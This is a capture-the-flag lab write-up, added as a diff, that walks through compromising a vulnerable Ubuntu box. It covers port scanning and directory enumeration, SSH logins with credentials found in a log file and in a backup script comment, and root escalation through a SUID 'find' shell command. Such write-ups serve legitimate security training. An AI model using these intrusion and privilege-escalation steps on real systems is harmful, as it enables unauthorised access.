@@ -1,0 +1,261 @@
+1.Nmap :
+nmap -sS -sV -p- --min-rate 1000 10.80.165.241
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-24 06:51 EST
+Warning: 10.80.165.241 giving up on port because retransmission cap hit (10).
+Nmap scan report for 10.80.165.241
+Host is up (0.091s latency).
+Not shown: 65477 closed tcp ports (reset), 54 filtered tcp ports (no-response)
+PORT      STATE SERVICE VERSION
+21/tcp    open  ftp     vsftpd 3.0.3
+80/tcp    open  http    Apache httpd 2.4.18 ((Ubuntu))
+10000/tcp open  http    MiniServ 1.930 (Webmin httpd)
+55007/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 141.69 seconds
+
+
+ ftp 10.80.165.241     
+Connected to 10.80.165.241.
+220 (vsFTPd 3.0.3)
+Name (10.80.165.241:ahmaahanyy): anonymous
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls -la
+229 Entering Extended Passive Mode (|||48715|)
+150 Here comes the directory listing.
+drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 .
+drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 ..
+-rw-r--r--    1 ftp      ftp            74 Aug 21  2019 .info.txt
+ 
+cat .info.txt 
+Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!
+                              (ROT13)
+Just wanted to see if you find it. Lol. Remember: Enumeration is the key!
+
+-----------------------------------------------------------------------------------------------------------------------------------
+enum 
+                                                                                                                                                            
+┌──(ahmaahanyy㉿ahmaa)-[~/Desktop]
+└─$ dirsearch -u http://10.80.165.241/         
+
+/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                             
+ (_||| _) (/_(_|| (_| )                                                                                                                                      
+                                                                                                                                                             
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
+
+Output File: /home/ahmaahanyy/Desktop/reports/http_10.80.165.241/__25-11-24_07-46-42.txt
+
+Target: http://10.80.165.241/
+
+[07:46:42] Starting:                                                                                                                                         
+[07:46:48] 403 -  299B  - /.ht_wsr.txt                                      
+[07:46:49] 403 -  302B  - /.htaccess.bak1                                   
+[07:46:49] 403 -  302B  - /.htaccess.orig
+[07:46:49] 403 -  304B  - /.htaccess.sample                                 
+[07:46:49] 403 -  302B  - /.htaccess.save
+[07:46:49] 403 -  302B  - /.htaccess_orig                                   
+[07:46:49] 403 -  300B  - /.htaccess_sc
+[07:46:49] 403 -  300B  - /.htaccessBAK
+[07:46:49] 403 -  303B  - /.htaccess_extra
+[07:46:49] 403 -  300B  - /.htaccessOLD
+[07:46:49] 403 -  301B  - /.htaccessOLD2
+[07:46:49] 403 -  292B  - /.htm                                             
+[07:46:49] 403 -  293B  - /.html
+[07:46:49] 403 -  298B  - /.htpasswds                                       
+[07:46:49] 403 -  299B  - /.httr-oauth                                      
+[07:46:49] 403 -  302B  - /.htpasswd_test                                   
+[07:46:50] 403 -  292B  - /.php                                             
+[07:47:21] 301 -  315B  - /joomla  ->  http://10.80.165.241/joomla/         
+[07:47:21] 301 -  329B  - /joomla/administrator  ->  http://10.80.165.241/joomla/administrator/
+[07:47:24] 200 -  201B  - /manual/index.html                                
+[07:47:24] 301 -  315B  - /manual  ->  http://10.80.165.241/manual/         
+[07:47:28] 200 -    4KB - /joomla/                                          
+[07:47:34] 200 -  178B  - /robots.txt                                       
+[07:47:35] 403 -  301B  - /server-status                                    
+[07:47:35] 403 -  302B  - /server-status/                                   
+
+┌──(ahmaahanyy㉿ahmaa)-[~/Desktop]
+└─$ gobuster dir -u http://10.80.165.241/joomla/ -w /usr/share/wordlists/dirb/big.txt 
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.80.165.241/joomla/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.htaccess            (Status: 403) [Size: 304]
+/.htpasswd            (Status: 403) [Size: 304]
+/_archive             (Status: 301) [Size: 324] [--> http://10.80.165.241/joomla/_archive/]
+/_database            (Status: 301) [Size: 325] [--> http://10.80.165.241/joomla/_database/]
+/_files               (Status: 301) [Size: 322] [--> http://10.80.165.241/joomla/_files/]
+/_test                (Status: 301) [Size: 321] [--> http://10.80.165.241/joomla/_test/]
+/administrator        (Status: 301) [Size: 329] [--> http://10.80.165.241/joomla/administrator/]
+/bin                  (Status: 301) [Size: 319] [--> http://10.80.165.241/joomla/bin/]
+/build                (Status: 301) [Size: 321] [--> http://10.80.165.241/joomla/build/]
+/cache                (Status: 301) [Size: 321] [--> http://10.80.165.241/joomla/cache/]
+/cli                  (Status: 301) [Size: 319] [--> http://10.80.165.241/joomla/cli/]
+/components           (Status: 301) [Size: 326] [--> http://10.80.165.241/joomla/components/]
+/images               (Status: 301) [Size: 322] [--> http://10.80.165.241/joomla/images/]
+/includes             (Status: 301) [Size: 324] [--> http://10.80.165.241/joomla/includes/]
+/installation         (Status: 301) [Size: 328] [--> http://10.80.165.241/joomla/installation/]
+/language             (Status: 301) [Size: 324] [--> http://10.80.165.241/joomla/language/]
+/layouts              (Status: 301) [Size: 323] [--> http://10.80.165.241/joomla/layouts/]
+/libraries            (Status: 301) [Size: 325] [--> http://10.80.165.241/joomla/libraries/]
+/media                (Status: 301) [Size: 321] [--> http://10.80.165.241/joomla/media/]
+/modules              (Status: 301) [Size: 323] [--> http://10.80.165.241/joomla/modules/]
+/plugins              (Status: 301) [Size: 323] [--> http://10.80.165.241/joomla/plugins/]
+/templates            (Status: 301) [Size: 325] [--> http://10.80.165.241/joomla/templates/]
+/tests                (Status: 301) [Size: 321] [--> http://10.80.165.241/joomla/tests/]
+/tmp                  (Status: 301) [Size: 319] [--> http://10.80.165.241/joomla/tmp/]
+Progress: 20469 / 20470 (100.00%)
+/~www                 (Status: 301) [Size: 320] [--> http://10.80.165.241/joomla/~www/]
+
+---------------------------------------------------------------------------------------------------------------------------------------
+-after visiting /_test found that there is a vulnerable parameter called plot vulnerable to xss and command injection 
+after listing a content of the directory found that file named log.txt contains a username and password , used them to get initial foothold:
+----------------------------------------------------------------------------------------------------------------------------------------------------------
+initial foothold:
+
+ssh basterd@10.80.165.241 -p 55007    
+The authenticity of host '[10.80.165.241]:55007 ([10.80.165.241]:55007)' can't be established.
+ED25519 key fingerprint is SHA256:GhS3mY+uTmthQeOzwxRCFZHv1MN2hrYkdao9HJvi8lk.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[10.80.165.241]:55007' (ED25519) to the list of known hosts.
+basterd@10.80.165.241's password: 
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic i686)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+8 packages can be updated.
+8 updates are security updates.
+
+Last login: Thu Aug 22 12:29:45 2019 from 192.168.1.199
+$ whoami
+basterd
+
+cat backup.sh 
+REMOTE=1.2.3.4
+
+SOURCE=/home/stoner
+TARGET=/usr/local/backup
+
+LOG=/home/stoner/bck.log
+ 
+DATE=`date +%y\.%m\.%d\.`
+
+USER=stoner
+#superduperp@$$no1knows
+
+ssh $USER@$REMOTE mkdir $TARGET/$DATE
+
+
+if [ -d "$SOURCE" ]; then
+    for i in `ls $SOURCE | grep 'data'`;do
+             echo "Begining copy of" $i  >> $LOG
+             scp  $SOURCE/$i $USER@$REMOTE:$TARGET/$DATE
+             echo $i "completed" >> $LOG
+
+                if [ -n `ssh $USER@$REMOTE ls $TARGET/$DATE/$i 2>/dev/null` ];then
+                    rm $SOURCE/$i
+                    echo $i "removed" >> $LOG
+                    echo "####################" >> $LOG
+                                else
+                                        echo "Copy not complete" >> $LOG
+                                        exit 0
+                fi 
+    done
+     
+
+else
+
+    echo "Directory is not present" >> $LOG
+    exit 0
+fi
+---------------------------------------------------------------------------------------------------
+login as another user:
+ ssh stoner@10.80.165.241 -p 55007
+stoner@10.80.165.241's password: 
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic i686)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+8 packages can be updated.
+8 updates are security updates.
+
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+Last login: Thu Aug 22 16:05:13 2019
+stoner@Vulnerable:~$ whoami
+stoner
+stoner@Vulnerable:~$ ls
+stoner@Vulnerable:~$ ls -la
+total 20
+drwxr-x--- 4 stoner stoner 4096 Nov 24 15:36 .
+drwxr-xr-x 4 root   root   4096 Aug 22  2019 ..
+drwx------ 2 stoner stoner 4096 Nov 24 15:36 .cache
+drwxrwxr-x 2 stoner stoner 4096 Aug 22  2019 .nano
+-rw-r--r-- 1 stoner stoner   34 Aug 21  2019 .secret
+stoner@Vulnerable:~$ cat .secret
+You made it till here, well done.
+-----------------------------------------------------------------------------------------------------------------------------------------------
+privelege escalation:
+stoner@Vulnerable:~$ find / -type f -perm -u=s -ls 2>/dev/null
+   264453     40 -rwsr-xr-x   1 root     root        38900 Mar 26  2019 /bin/su
+   276977     32 -rwsr-xr-x   1 root     root        30112 Jul 12  2016 /bin/fusermount
+   260151     28 -rwsr-xr-x   1 root     root        26492 May 15  2019 /bin/umount
+   260156     36 -rwsr-xr-x   1 root     root        34812 May 15  2019 /bin/mount
+   260172     44 -rwsr-xr-x   1 root     root        43316 May  7  2014 /bin/ping6
+   260171     40 -rwsr-xr-x   1 root     root        38932 May  7  2014 /bin/ping
+   394226     16 -rwsr-xr-x   1 root     root        13960 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
+   416088     16 -rwsr-xr--   1 root     www-data    13692 Apr  3  2019 /usr/lib/apache2/suexec-custom
+   416085     16 -rwsr-xr--   1 root     www-data    13692 Apr  3  2019 /usr/lib/apache2/suexec-pristine
+   260101     48 -rwsr-xr--   1 root     messagebus    46436 Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+   264108    504 -rwsr-xr-x   1 root     root         513528 Mar  4  2019 /usr/lib/openssh/ssh-keysign
+   260699      8 -rwsr-xr-x   1 root     root           5480 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
+   265132     36 -rwsr-xr-x   1 root     root          36288 Mar 26  2019 /usr/bin/newgidmap
+   260428    228 -r-sr-xr-x   1 root     root         232196 Feb  8  2016 /usr/bin/find
+   278157     52 -rwsr-sr-x   1 daemon   daemon        50748 Jan 15  2016 /usr/bin/at
+   263308     40 -rwsr-xr-x   1 root     root          39560 Mar 26  2019 /usr/bin/chsh
+   263304     76 -rwsr-xr-x   1 root     root          74280 Mar 26  2019 /usr/bin/chfn
+   263305     52 -rwsr-xr-x   1 root     root          53128 Mar 26  2019 /usr/bin/passwd
+   260641     36 -rwsr-xr-x   1 root     root          34680 Mar 26  2019 /usr/bin/newgrp
+   263253    160 -rwsr-xr-x   1 root     root         159852 Jun 11  2019 /usr/bin/sudo
+   264477     20 -rwsr-xr-x   1 root     root          18216 Mar 27  2019 /usr/bin/pkexec
+   263306     80 -rwsr-xr-x   1 root     root          78012 Mar 26  2019 /usr/bin/gpasswd
+   265133     36 -rwsr-xr-x   1 root     root          36288 Mar 26  2019 /usr/bin/newuidmap
+
+stoner@Vulnerable:~$ /usr/bin/find . -exec /bin/sh -p \; -quit
+# whoami
+root
+# cd /root
+# ls 
+root.txt
+# cat root.txt
+It wasn't that hard, was it?
+
+
